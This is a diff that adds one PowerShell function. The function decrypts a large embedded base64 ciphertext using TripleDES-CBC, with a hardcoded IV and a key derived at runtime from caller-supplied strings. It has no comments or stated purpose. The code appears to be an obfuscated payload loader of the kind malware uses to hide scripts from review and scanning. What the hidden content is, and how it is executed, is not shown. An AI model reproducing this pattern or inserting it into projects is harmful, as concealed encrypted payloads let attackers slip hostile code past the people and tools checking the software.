@@ -1,0 +1,21 @@
+function de([String] $b, [String] $c)
+{
+$a = "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";
+$encoding = New-Object System.Text.ASCIIEncoding;
+$dd = $encoding.GetBytes("SUXLYZHFYFHAMJZC");
+$aa = [Convert]::FromBase64String($a);
+$derivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($b, $encoding.GetBytes($c), "SHA1", 2);
+[Byte[]] $e = $derivedPass.GetBytes(16);
+$f = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider;
+$f.Mode = [System.Security.Cryptography.CipherMode]::CBC;
+[Byte[]] $h = New-Object Byte[]($aa.Length);
+$g = $f.CreateDecryptor($e, $dd);
+$i = New-Object System.IO.MemoryStream($aa, $True);
+$j = New-Object System.Security.Cryptography.CryptoStream($i, $g, [System.Security.Cryptography.CryptoStreamMode]::Read);
+$r = $j.Read($h, 0, $h.Length);
+$i.Close();
+$j.Close();
+$f.Clear();
+if (($h.Length -gt 3) -and ($h[0] -eq 0xEF) -and ($h[1] -eq 0xBB) -and ($h[2] -eq 0xBF)) { $h = $h[3..($h.Length-1)]; }
+return $encoding.GetString($h).TrimEnd([Char] 0);
+}
